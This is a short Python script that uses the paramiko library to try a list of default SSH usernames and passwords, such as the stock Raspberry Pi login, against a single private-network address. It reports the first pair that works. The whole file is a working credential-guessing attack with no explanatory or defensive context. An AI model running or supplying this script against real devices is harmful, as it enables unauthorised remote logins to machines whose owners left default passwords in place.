import paramiko

def try_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=2)
        print(f"Success: {username}:{password}")
        return True
    except:
        return False
    finally:
        client.close()

ip = '192.168.137.231'
creds = [('pi', 'raspberry'), ('pi', 'pi'), ('ubuntu', 'ubuntu'), ('pi', '123456')]

for u, p in creds:
    if try_ssh(ip, u, p):
        break
